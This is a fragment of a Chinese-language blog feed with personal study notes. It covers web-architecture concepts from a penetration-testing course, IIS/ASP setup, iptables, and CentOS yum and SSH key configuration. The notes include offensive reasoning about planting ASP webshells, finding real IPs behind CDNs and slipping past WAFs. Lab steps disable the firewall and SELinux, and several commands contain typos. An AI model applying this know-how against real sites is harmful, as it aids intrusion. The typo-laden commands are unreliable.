http://fzjh/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="今日反省"><a href="#今日反省" class="headerlink" title="今日反省"></a>今日反省</h1><p>博客建起来后，那访问的速度啊，真的是文件越多访问越慢。不知道是不是今天刚二次部署的关系，加载变成了白屏。所以今天费了一番功夫开了另外一个地方放图片。说真的，今天最耗时间的除了听迪哥的课外，就是git的main和支线的问题。因为之前提交过大文件的原因，害得我反反复复部署了好几次仓库，好不容易部署完了，还得一个一个博客的更换图片地址……😰😰😰</p><p>罢了，以后换个习惯，图片资源另外备份吧……</p><p>今天还是理论基础内容，主要是CDN加速，WAF防护，正向反向代理，OSS云存储，负载均衡。这些是之前有见过一些的概念，OSS是未曾了解的新概念。还有得到一个重要的结论：钻人家WAF的空子，不然真的过不去。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0007-基础web篇</title>
      <link href="/2023/03/19/SEC-Study-0007/"/>
      <url>/2023/03/19/SEC-Study-0007/</url>
      
        <content type="html"><![CDATA[<p>基础web</p><span id="more"></span><h1 id="001-基础入门-蓝图"><a href="#001-基础入门-蓝图" class="headerlink" title="001-基础入门-蓝图"></a>001-基础入门-蓝图</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li>Web常规-系统&amp;中间件&amp;数据库&amp;源码等</li><li>Web其他-前后端&amp;软件&amp;Docker&amp;分配站等</li><li>Web拓展-CDN&amp;WAF&amp;OSS&amp;静态&amp;负载均衡等</li></ol><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>应用架构：Web/APP/云应用/三方服务/负载均衡等</li><li>安全产品：CDN/WAF/IDS/IPS/蜜罐/防火墙/杀毒等</li><li>渗透命令：文件上传下载/端口服务/Shell反弹等</li><li>抓包技术：HTTP/TCP/UDP/ICMP/DNS/封包/代理等</li><li>算法加密：数据编码/密码算法/密码保护/反编译/加壳等</li></ul><p>主要是对我们安全测试的影响。</p><h1 id="web应用的其他模式"><a href="#web应用的其他模式" class="headerlink" title="web应用的其他模式"></a>web应用的其他模式</h1><h2 id="常规化"><a href="#常规化" class="headerlink" title="常规化"></a>常规化</h2><p>原理：源码数据都在同服务器<br>影响：无，常规安全测试手法<br>效率：相对于前后端，效率更高(具体看需要)</p><h2 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h2><p>原理：源码数据库不在同服务器<br>体现：前台后台共用一个域名。<br>形如：</p><ul><li><a href="http://www.baidu.com/index.php">www.baidu.com/index.php</a></li><li><a href="http://www.baidu.com/admin/index.php">www.baidu.com/admin/index.php</a></li></ul><p>存储：其他服务器上数据库&amp;云数据库产品<br>影响：数据被单独存放，能连接才可影响数据</p><h2 id="前后端分离"><a href="#前后端分离" class="headerlink" title="前后端分离"></a>前后端分离</h2><p>原理：前端JS框架，API传输数据<br>理解：</p><ul><li>前台与后台网站不同，使用接口进行传输。</li><li>前台仅负责展示，后台负责传输存储，使用API链接。</li><li>前端语言特性决定了它的漏洞很少。</li><li>页面较少，简洁。</li></ul><p>体现：前台与后台网站域名不同。<br>形如：</p><ul><li><a href="http://www.baidu.com/">www.baidu.com</a> - 前台</li><li>mange.thinkphp6.elevue.rxthink.cn/content/item - 后台</li></ul><p>影响：<br>1、前端页面大部分不存在漏洞<br>2、后端管理大部分不在同域名<br>3、获得权限有可能不影响后端</p><blockquote><p>漏洞的突破口在后端<br>找不到=&gt; 找历史漏洞框架<br>都找不到=&gt;换思路<br>辨别：观察页面简洁程度(信息收集)</p></blockquote><h2 id="宝塔-Phpstudy-iis"><a href="#宝塔-Phpstudy-iis" class="headerlink" title="宝塔+Phpstudy+iis"></a>宝塔+Phpstudy+iis</h2><p>原理：打包类集成化环境，权限配置或受控制<br>说明：</p><ul><li>普通网站：传入文件并且可以执行</li><li>宝塔面板(几者最安全)：<ul><li>上传文件无法执行，权限受限，目录锁定+无法执行。</li></ul></li><li>phpstudy：<ul><li>whomi获取用户权限 - administrator</li><li>cmd =&gt; whomi =&gt; izsjmy4bzovoz\administrator（主机名+用户名）</li></ul></li><li>iis：<ul><li>可以看到上一级目录</li><li>能执行部分命令</li><li>cmd =&gt; whomi =&gt; iis appoool\defaultappool</li></ul></li><li>软件安装时会继承安装者权限。</li></ul><p>影响：攻击者权限对比区别</p><h2 id="Docker容器"><a href="#Docker容器" class="headerlink" title="Docker容器"></a>Docker容器</h2><p>原理：虚拟化技术独立磁盘空间，非真实物理环境<br>说明：</p><ul><li>别人把搭建网站和实例搭建好后，使用镜像封装起来，你只需要将镜像拉出来还原就能使用了。</li><li>服务器搭建docker，docker会搭建一个虚拟空间，攻击者打下的是虚拟空间的权限而不是网站的真实权限。</li><li>需要docker逃逸(以后学):从服务器docker虚拟空间逃出来。</li></ul><p>影响：攻击者虚拟空间磁盘</p><h2 id="建站分配站"><a href="#建站分配站" class="headerlink" title="建站分配站"></a>建站分配站</h2><p>模式：<br>1.托管<br>2.申请</p><p>原理：利用别人域名+模版建立 - 全程套用,给你分配使用权</p><p>影响：实质安全测试非目标资产</p><ul><li>域名查询，查看域名信息与网站表述是否一致</li><li>重要数据不会在上面</li><li>要找真实网站</li></ul><h2 id="静态Web"><a href="#静态Web" class="headerlink" title="静态Web"></a>静态Web</h2><p>例子：大学学的html设计的网站<br>原理：数据没有传输性（js传输不算）<br>影响：无漏洞</p><h2 id="伪静态"><a href="#伪静态" class="headerlink" title="伪静态"></a>伪静态</h2><ul><li>动态转为静态技术，伪装的静态。</li><li>看起来像静态网站，实际上是动态网站。</li></ul><h1 id="今日自省"><a href="#今日自省" class="headerlink" title="今日自省"></a>今日自省</h1><p>搭建靶场+部署宝塔+购买云服务器+购买域名且等待生效和部署耗费太多时间。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-IIS搭建ASP支持+数据库支持(本地access)</title>
      <link href="/2023/03/18/SEC-tool-0002/"/>
      <url>/2023/03/18/SEC-tool-0002/</url>
      
        <content type="html"><![CDATA[<p>下面演示下怎么搭建asp网站支持的Windows server 2012环境。</p><span id="more"></span><h1 id="安装服务"><a href="#安装服务" class="headerlink" title="安装服务"></a>安装服务</h1><p><img src="c1.jpg" alt="安装服务1"><br><img src="c2.jpg" alt="安装服务2"><br><img src="c3.jpg" alt="安装服务3"><br>后面就是不断下一步到安装成功。</p><h1 id="配置服务"><a href="#配置服务" class="headerlink" title="配置服务"></a>配置服务</h1><p>先把asp网站源码使用FTP上传上去，具体使用在[<a href="https://linxiao-wangchuan.github.io/2023/03/09/SEC-tool-0001/">工具学习</a>]的开始搭建FTP那里开始，流程是一样的，这里不赘述。</p><p><img src="c4.jpg" alt="配置iis"><br><img src="c5.jpg" alt="配置iis"><br><img src="c6.jpg" alt="配置iis"><br><img src="c7.jpg" alt="配置iis"><br><img src="c8.jpg" alt="配置iis"><br><img src="c9.jpg" alt="配置iis"></p><p>搭建完成，成功访问z-blog<br><img src="c10.jpg" alt="配置iis"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
            <tag> 靶场 </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0006-基础web篇-更迭</title>
      <link href="/2023/03/17/SEC-Study-0006/"/>
      <url>/2023/03/17/SEC-Study-0006/</url>
      
        <content type="html"><![CDATA[<p><span style="color:red"> <strong>更迭警告：换视频资源</strong> </span></p><span id="more"></span><p>更迭警告：从这一期开始，将更改观看的视频资源为2022年版的<br>原因：</p><ul><li>2022年版比较贴近当下，2018年版有点过时了</li><li>2022年版资源充足</li></ul><p>虽然换来换去很是不好，但如果能更加贴合时代发展，就意味着能更好的适应社会。况且B站的资源是有残缺的，所以……<br>害，我的几千块呐……！拼了！</p><p><strong>大前提</strong> ： <span style="color:red"> <strong>任何有点沾公网的操作都应该选择去网上查查，而不是直接在公网上手各种操作！</strong> </span></p><p><span style="color:red;font-size:8px"> <strong>做事不谨慎，牢饭管到饱……</strong> </span></p><h1 id="001-基础入门-蓝图"><a href="#001-基础入门-蓝图" class="headerlink" title="001-基础入门-蓝图"></a>001-基础入门-蓝图</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li>Web常规-系统&amp;中间件&amp;数据库&amp;源码等</li><li>Web其他-前后端&amp;软件&amp;Docker&amp;分配站等</li><li>Web拓展-CDN&amp;WAF&amp;OSS&amp;静态&amp;负载均衡等</li></ol><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>应用架构：Web/APP/云应用/三方服务/负载均衡等</li><li>安全产品：CDN/WAF/IDS/IPS/蜜罐/防火墙/杀毒等</li><li>渗透命令：文件上传下载/端口服务/Shell反弹等</li><li>抓包技术：HTTP/TCP/UDP/ICMP/DNS/封包/代理等</li><li>算法加密：数据编码/密码算法/密码保护/反编译/加壳等</li></ul><h1 id="网站搭建"><a href="#网站搭建" class="headerlink" title="网站搭建"></a>网站搭建</h1><h2 id="Web常规-系统-中间件-数据库-源码等"><a href="#Web常规-系统-中间件-数据库-源码等" class="headerlink" title="Web常规-系统+中间件+数据库+源码等"></a>Web常规-系统+中间件+数据库+源码等</h2><p>常规的Web应用搭建(真实网站的搭建)<br>原理：源码和数据库在同一个服务器上面。</p><p>子域名-端口站-目录站<br><img src="c2.jpg" alt="常规的Web应用搭建"></p><h2 id="Web其他-前后端-集成软件-Docker-分配站等"><a href="#Web其他-前后端-集成软件-Docker-分配站等" class="headerlink" title="Web其他-前后端+集成软件+Docker+分配站等"></a>Web其他-前后端+集成软件+Docker+分配站等</h2><h3 id="分配站"><a href="#分配站" class="headerlink" title="分配站"></a>分配站</h3><p>依托性网站：依靠 <strong>别人分配</strong> 的 <strong>空间</strong> 和 <strong>域名</strong> 的网站</p><p>安全测试点：针对分配站的域名进行测试。寻常情况安全系数高。分配站有些为公司所有。</p><h3 id="集成软件式"><a href="#集成软件式" class="headerlink" title="集成软件式"></a>集成软件式</h3><p>继承一体化安装：一站式部署，简单便捷。</p><p>例如宝塔，phpstudy。</p><p>Docker：一种云容器。</p><h2 id="Web拓展-CDN-WAF-OSS-静态-负载均衡等"><a href="#Web拓展-CDN-WAF-OSS-静态-负载均衡等" class="headerlink" title="Web拓展-CDN+WAF+OSS+静态+负载均衡等"></a>Web拓展-CDN+WAF+OSS+静态+负载均衡等</h2><p>站库分离：源码和数据库不在同一个服务器上。</p><ul><li>CDN : 节点分发，从主服务器当中缓存数据到CDN节点，方便访问。使用CDN会掩盖真实ip，如果可能的话使用某些方法获取CDN的解析记录获取真实IP地址的话……</li><li>WAF : web防火墙</li><li>OSS : 对象存储服务，管理内容，没有可执行权限。</li><li>静态: 不需要服务器处理，客户端直接访问。</li><li>负载均衡: 将请求负载平均分配到各服务器节点上。</li></ul><h1 id="原域名和子域名的理解"><a href="#原域名和子域名的理解" class="headerlink" title="原域名和子域名的理解"></a>原域名和子域名的理解</h1><p><strong>网站：</strong> <a href="http://www.baidu.com/">www.baidu.com</a><br><strong>原域名</strong> : 云厂商获得，购买即指定，如: baidu.com。也称为一级域名(有些人习惯将其当中一个整体，所以称为一级域名)<br><strong>子域名</strong> : 子域名可以自己设置，例如“www.”，“tieba”。</p><h1 id="网站的几种访问模式"><a href="#网站的几种访问模式" class="headerlink" title="网站的几种访问模式"></a>网站的几种访问模式</h1><h2 id="子域名模式"><a href="#子域名模式" class="headerlink" title="子域名模式"></a>子域名模式</h2><p><span style="color:red"> <strong>各个子域名可以指定不同的运行程序。</strong> </span></p><p>例如：</p><ul><li>“www”指向zblog程序，完整访问写法就是：<a href="http://www.baidu.com/">www.baidu.com</a></li><li>“tieba”指向wordpress程序，完整的写法就是：tieba.baidu.com</li></ul><p>两者处理起来相互之间不会有任何影响，两者是 <strong>互相分开，独立运行</strong> 的。( <strong>域名扫描</strong> )</p><h2 id="端口模式"><a href="#端口模式" class="headerlink" title="端口模式"></a>端口模式</h2><p><span style="color:red"> <strong>相同的域名，不一样的端口能访问出多个网站.</strong> </span> ( <strong>端口扫描</strong> )</p><p>举个例子：</p><ul><li><a href="http://www.baidu.com/">www.baidu.com:80</a></li><li><a href="http://www.baidu.com:9800/">www.baidu.com:9800</a></li></ul><h2 id="目录模式"><a href="#目录模式" class="headerlink" title="目录模式"></a>目录模式</h2><p>访问方法：http://(域名/ip地址)/文件路径</p><p>这是wampserver常见到的类型。</p><p>1.IP地址的形式</p><p>下图是直接在浏览器使用localhost+路径直接访问网站源码的。<br><img src="c1.jpg" alt="Windows阿帕奇示范"><br>安全风险：可以通过切换到localhost访问根目录下所有的文件。</p><p>2.域名的形式</p><p>形如：<a href="http://www.baidu.com/pyg">www.baidu.com/pyg</a></p><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><h2 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h2><p>了解源码的结构有助于我们后续做测试。</p><ul><li>数据库目录</li><li>后台目录</li><li>文件目录</li></ul><h2 id="源码类型"><a href="#源码类型" class="headerlink" title="源码类型"></a>源码类型</h2><p><span style="color:red"> <strong>白盒测试</strong> - <strong>代码审计</strong> </span> - 源码</p><h3 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h3><p><strong>概念</strong> ：网上免费公开的程序源码，安全系数低。</p><p>应用场景：自己搭建的博客源码，门户网站等。</p><p><strong>分类</strong> ：</p><ul><li>源码可见</li><li>源码不可见：<ul><li>加密<ul><li>asp(少)/php(主流)/java(主流)</li><li>不影响本身的功能</li><li>源码以乱码展示</li></ul></li><li>语言特性决定的<ul><li>Java文件运行时，从“.java”变为“.class”,文件内容会改变</li><li>意思是：下载下来的网站源码与它后台的网站源码不一样。</li><li>可下载，但内容不可见</li></ul></li></ul></li></ul><h3 id="商业-闭源"><a href="#商业-闭源" class="headerlink" title="商业(闭源)"></a>商业(闭源)</h3><p>概念：</p><ul><li>提供程序，不提供源代码。</li><li>公司团队自己做的一套程序。</li><li>不卖源代码卖服务，安全系数高。</li></ul><p>大公司会使用自己的源码，避免因为开源程序被入侵等。</p><p>辨别开源与闭源有助于SRC的挖掘。</p><h3 id="自用"><a href="#自用" class="headerlink" title="自用"></a>自用</h3><p>自己开发自己用，不提供给别人。</p><h2 id="路由访问控制"><a href="#路由访问控制" class="headerlink" title="路由访问控制"></a>路由访问控制</h2><h3 id="常规访问"><a href="#常规访问" class="headerlink" title="常规访问"></a>常规访问</h3><p>URL和文件目录对应得上。</p><p>根据网站目录，访问该网站目录下某个文件路径的文件。文件在目录下，可以直接访问到。</p><p>访问的方式分为 <strong>绝对路径</strong> 和 <strong>相对路径</strong> ，至于这两者的概念，不赘述。</p><h3 id="路由访问"><a href="#路由访问" class="headerlink" title="路由访问"></a>路由访问</h3><ul><li>URL和文件目录对应不上，要根据 <strong>配置路由</strong> 决定。</li><li>mvc源码，java，python</li><li>文件在目录下，你却访问不到。</li><li>在特定的路由下触发特定的文件(后门)</li></ul><h1 id="访问控制-中间件"><a href="#访问控制-中间件" class="headerlink" title="访问控制(中间件)"></a>访问控制(中间件)</h1><p>下面两者都会限制安全测试，不能绕过，遇到就只能找其他办法/突破口。</p><h2 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h2><p>iis的Mime类型：设置文件的解析类型，使文件能正常的被解析为对应格式的文件进行展现。</p><p>举个例子：访问index.php出现的是对应的php页面而不是下载文件，就说明了“.php”文件能被正常解析。而出现直接下载php文件的情况，就是文件未被正常解析。</p><h2 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h2><p>脚本所在目录是否有脚本的执行权限。</p><p>例如：在某文件目录下有asp解析权限，那么该目录大概率可以插入一句话的asp木马。</p><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><p>身份认证，是指访问网站时需要登录账户才能访问。</p><p>类似于那种弹出窗口，强制你登录后才能访问的那种网站。</p><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>数据库配置文件–可以使用Office自带的数据库软件打开</p><h2 id="本地一致"><a href="#本地一致" class="headerlink" title="本地一致"></a>本地一致</h2><p>数据库文件与源码文件存储在同一个源码文件夹下。</p><p>数据库文件一般为“***app.config”.</p><h2 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h2><p>数据库文件与源码文件互相分离。</p><p>实现方式：</p><ul><li>云数据库应用<ul><li>在特定专门用于存储数据库的平台存储数据。</li><li>安全系数高，防护好，可以控制ip/设备的访问，即便是账密泄露也无法被登录。</li></ul></li><li>另一台云服务器的数据库<ul><li>在服务器的基础上再搭建一个存储数据的数据库。</li></ul></li></ul><h1 id="梗概"><a href="#梗概" class="headerlink" title="梗概"></a>梗概</h1><h2 id="资产架构："><a href="#资产架构：" class="headerlink" title="资产架构："></a>资产架构：</h2><p>WEB单个源码指向安全<br>WEB多个目录源码安全<br>WEB多个端口源码安全<br>服务器架设多个站点安全<br>架设第三方插件接口安全<br>服务器架设多个应用安全</p><h2 id="番外安全："><a href="#番外安全：" class="headerlink" title="番外安全："></a>番外安全：</h2><p>基于域名解析安全<br>基于服务器本身安全<br>基于服务商信息安全<br>基于管理个人的安全</p><h2 id="考虑阻碍："><a href="#考虑阻碍：" class="headerlink" title="考虑阻碍："></a>考虑阻碍：</h2><p>阻碍-站库分离<br>阻碍-CDN加速服务<br>阻碍-负载均衡服务<br>阻碍-WAF应用防火墙<br>阻碍-主机防护防火墙</p><!-- 网站有一个数据库配置文件，且此配置文件会总的进行资源调度，例如用户，密码，连接主数据库的配置等。站库分离：网站源码和数据库是分离的 -》 z-blog的SQL创建，不是MSSQL的那种。数据库配置文件：类似于“xxxapp.config”站库分离，可以单独的购买数据库服务，更加安全（绑定IP地址，限制IP访问等），这样即便有账户也登录不上。对象存储服务器OSS：文件上传等都存储到OSS当中，OSS只做存储，不做解析(一般情况下是这样的)，上传脚本也没有用。后面信息收集的东西：针对目标，判断是什么类型，根据类型寻找突破口。源码结构理解网站的结构，也就是网站源代码各个目录代表什么意思。 -->]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Server-Study-004</title>
      <link href="/2023/03/16/Linux-Server-Study-004/"/>
      <url>/2023/03/16/Linux-Server-Study-004/</url>
      
        <content type="html"><![CDATA[<h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><span id="more"></span><h2 id="安装方式"><a href="#安装方式" class="headerlink" title="安装方式"></a>安装方式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这里采用的是本地yum安装，yum安装步骤且看上篇。</span><br><span class="line">mount /dev/cdrom /mnt/cdrom</span><br><span class="line">yum install -y iptables</span><br></pre></td></tr></table></figure><h2 id="概念概述"><a href="#概念概述" class="headerlink" title="概念概述"></a>概念概述</h2><p>iptables 是集成在 Linux 内核中的包过滤防火墙系统。<br>使用 iptables 可以添加、删除具体的过滤规则.<br>iptables 默认维护着 4 个表和 5 个链，所有的防火墙策略规则都被分别写入这些表与链中。</p><p>四个表：</p><pre><code>filter 表：默认表，用于过滤数据包，它包含三个默认的链：INPUT、OUTPUT 和 FORWARD。nat 表：用于网络地址转换（NAT），它包含三个默认的链：PREROUTING、POSTROUTING 和 OUTPUT。mangle 表：用于修改数据包的服务类型、TTL 和其他特性，它包含五个默认的链：PREROUTING、OUTPUT、INPUT、FORWARD 和 POSTROUTING。raw 表：用于禁止对数据包进行任何处理，它包含两个默认的链：PREROUTING 和 OUTPUT。</code></pre><p>五个预定义的链：</p><pre><code>PREROUTING：用于处理接收到的数据包，包括 NAT 和其他一些操作。INPUT：用于处理数据包进入本地系统的情况，如本地进程的通信。FORWARD：用于处理从本地系统转发到其他系统的数据包。OUTPUT：用于处理从本地系统发送的数据包。POSTROUTING：用于处理从系统出口传输的数据包，如 NAT</code></pre><p>为了方便查阅和理解，我修改成了下图……<br><img src="c1.jpg" alt="四表五链概括图"><br><img src="c2.jpg" alt="五链"></p><p>语法： <strong>iptables [-t 表名] 命令链 [规则号] [选项]</strong><br>iptables [-t 表名] [选项] [链名] [匹配条件] [动作]</p><p><strong>-t 表名</strong> 参数: 用于指定要操作的表，如果没有指定，默认为 <strong>filter</strong> 表。<br><strong>命令链</strong> : 要操作的链。<br><strong>规则号</strong> : 在链中指定规则的序号。<br><strong>选项</strong> : 指定规则的具体内容。</p><p>常见的选项包括：</p><ul><li>-p :       指定协议类型。</li><li>-s :       指定源 IP 地址。</li><li>-d :       指定目标 IP 地址。</li><li>--sport : 指定源端口。</li><li>--dport : 指定目标端口。</li><li>-j :       指定要执行的动作，如 ACCEPT、DROP 或 REJECT 等。</li><li>-i :       指定输入接口。</li><li>-o :       指定输出接口。</li><li>-m :       指定要使用的模块，如 state、conntrack 等。</li></ul><p><img src="c3.jpg" alt="iptables工作流程"><br><img src="c4.jpg" alt="数据包流向"></p><h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><p>iptables [-t filter] [-AI INPUT,OUTPUT,FORWARD] [-io interface] [-p tcp,udp.icmp,all] [-s ip/nerwork] [–sport ports] [-d ip/netword] [–dport ports] [-j ACCEPT DROP]</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables –F   //清除所有规则，不会处理默认的规则</span><br><span class="line">iptables –X   //删除用户自定义的链</span><br><span class="line">iptables –Z   //链的计数器清零</span><br></pre></td></tr></table></figure><p>状态不佳，明个细细补上……</p>]]></content>
      
      
      
        <tags>
            
            <tag> Server </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Server-Study-003</title>
      <link href="/2023/03/15/Linux-Server-Study-003/"/>
      <url>/2023/03/15/Linux-Server-Study-003/</url>
      
        <content type="html"><![CDATA[<p>日志内容：本地yum配置，ssh配置</p><span id="more"></span><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">网卡开启命令</span><br><span class="line">ifconfig ens33 up</span><br><span class="line"></span><br><span class="line">如果：</span><br><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">systemctl restart network</span><br><span class="line">ifconfig</span><br><span class="line">上面一套操作显示出来的结果显示IP地址没有修改，那么：</span><br><span class="line">在ifcfg-ens33上面修改下面配置：</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">NM-CONTROLLED=no</span><br><span class="line"></span><br><span class="line">如果：</span><br><span class="line">出现网卡无法显示，只有环回地址的情况的话，使用下面的命令进行调整：</span><br><span class="line">systemctl stop NetworkManger.service</span><br><span class="line">systemctl <span class="built_in">disable</span> NetworkManger.service</span><br><span class="line">systemctl status NetworkManger.service</span><br><span class="line">原因：</span><br><span class="line">NetworkManger和network发生冲突了。</span><br></pre></td></tr></table></figure><h1 id="本地yum配置"><a href="#本地yum配置" class="headerlink" title="本地yum配置"></a>本地yum配置</h1><h2 id="挂载光盘"><a href="#挂载光盘" class="headerlink" title="挂载光盘"></a>挂载光盘</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /mnt/cdrom</span><br><span class="line">mount /dev/cdrom /dev/cdrom</span><br></pre></td></tr></table></figure><h2 id="配置yum"><a href="#配置yum" class="headerlink" title="配置yum"></a>配置yum</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/</span><br><span class="line"><span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">cp</span> -r yum.repos.d yum.repos.d_bak</span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line"><span class="built_in">rm</span> -rf ./yum.repos.d/*</span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">vi ./yum.repos.d/Centos-iso.repo  </span><br></pre></td></tr></table></figure><p>配置信息如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Centos-iso]</span><br><span class="line">name=Centos-iso</span><br><span class="line">baseurl=file:///dev/cdrom</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><p>vi 完成后，可以做下面的操作，也可以直接使用yum</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 清除yum缓存</span></span><br><span class="line">yum clean all</span><br><span class="line"><span class="comment"># 缓存本地yum源</span></span><br><span class="line">yum makecache</span><br><span class="line"><span class="comment"># 测试yum本地源 </span></span><br><span class="line">yum list</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安装apache"><a href="#安装apache" class="headerlink" title="安装apache"></a>安装apache</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">yum install -y httpd</span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">systemctl start httpd</span><br><span class="line"><span class="comment"># 使用火狐进行验证，如果成功，会弹出默认界面</span></span><br><span class="line">firefox 10.0.0.1 </span><br></pre></td></tr></table></figure><h1 id="ssh配置"><a href="#ssh配置" class="headerlink" title="ssh配置"></a>ssh配置</h1><p>目的：主机间无障碍连接</p><p><strong>准备</strong> ：</p><ul><li>准备两台Centos虚拟机</li><li>一台作为服务器，命名为Cen-S</li><li>一台作为客户端，命名为Cen-C</li></ul><h2 id="配置ip-关防火墙-关selinux"><a href="#配置ip-关防火墙-关selinux" class="headerlink" title="配置ip+关防火墙+关selinux"></a>配置ip+关防火墙+关selinux</h2><p>两台虚拟机同时执行下面的命令关闭防火墙和</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@Cen-S ~]<span class="comment"># vi /etc/sysconfig/network-scripts/ifcfg-ens33</span></span><br><span class="line"><span class="comment"># 主要修改下面一些东西</span></span><br><span class="line">BOOTROTO=<span class="string">&quot;none&quot;</span></span><br><span class="line">NAME=<span class="string">&quot;ens33&quot;</span></span><br><span class="line">DEVICE=<span class="string">&quot;ens33&quot;</span></span><br><span class="line">ONBOOT=<span class="string">&quot;yes&quot;</span></span><br><span class="line">IPADDR=10.0.0.2</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=10.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">[root@Cen-S ~]<span class="comment"># systemctl restart network</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务端：10.0.0.2</span></span><br><span class="line"><span class="comment"># 客户端：10.0.0.3</span></span><br></pre></td></tr></table></figure><p>关防火墙+selinux</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@Cen-S ~]<span class="comment"># systemctl stop firewalld</span></span><br><span class="line">[root@Cen-S ~]<span class="comment"># systemctl disable firewalld</span></span><br><span class="line">[root@Cen-S ~]<span class="comment"># systemctl status firewalld</span></span><br><span class="line"></span><br><span class="line">[root@Cen-S ~]<span class="comment"># setenforce 0</span></span><br><span class="line">[root@Cen-S ~]<span class="comment"># vi /etc/selinux/config</span></span><br><span class="line">SELINUX=permissive</span><br></pre></td></tr></table></figure><h2 id="配置密钥"><a href="#配置密钥" class="headerlink" title="配置密钥"></a>配置密钥</h2><p>双方共通的一条命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成密钥</span></span><br><span class="line">[root@Cen-S ~]<span class="comment"># ssh-keygen -t rsa </span></span><br><span class="line">[root@Cen-C ~]<span class="comment"># ssh-keygen -t rsa </span></span><br></pre></td></tr></table></figure><h2 id="传输密钥"><a href="#传输密钥" class="headerlink" title="传输密钥"></a>传输密钥</h2><p>服务端存公钥：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@Cen-S ~]<span class="comment"># cd /root/.ssh</span></span><br><span class="line"><span class="comment"># 把公钥存储起来</span></span><br><span class="line">[root@Cen-S .ssh]<span class="comment"># cat ip_rsa.pub &gt;&gt; authorized_keys</span></span><br></pre></td></tr></table></figure><p>客户端传公钥：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 把客户端公钥传到服务端</span></span><br><span class="line">[root@Cen-C ~]<span class="comment"># cd /root/.ssh</span></span><br><span class="line">[root@Cen-C .ssh]<span class="comment"># ssh-copy-id -i 10.0.0.2</span></span><br></pre></td></tr></table></figure><p>服务端分发公钥，实现免密登录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@Cen-S .ssh]<span class="comment"># cd /root/.ssh</span></span><br><span class="line"><span class="comment"># 收集到客户端公钥后，可以使用cat打开看看</span></span><br><span class="line">[root@Cen-S .ssh]<span class="comment"># cat authorized_keys</span></span><br><span class="line"><span class="comment"># 把密钥传输过去</span></span><br><span class="line">[root@Cen-S .ssh]<span class="comment"># scp authorized_keys 10.0.0.3:/root/.ssh</span></span><br></pre></td></tr></table></figure><p>配置完成后，使用ssh实现免密登录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@Cen-S .ssh]<span class="comment"># ssh 10.0.0.3</span></span><br><span class="line">Last login: Wed Mar 15 15:30:33 2023</span><br><span class="line">ABRT has detected 1 problem(s). For more info run: abrt-cli list --since 1678865433</span><br><span class="line">[root@Cen-C ~]<span class="comment">#  </span></span><br><span class="line"><span class="comment"># exit退出登录</span></span><br><span class="line">[root@Cen-C ~]<span class="comment"># exit  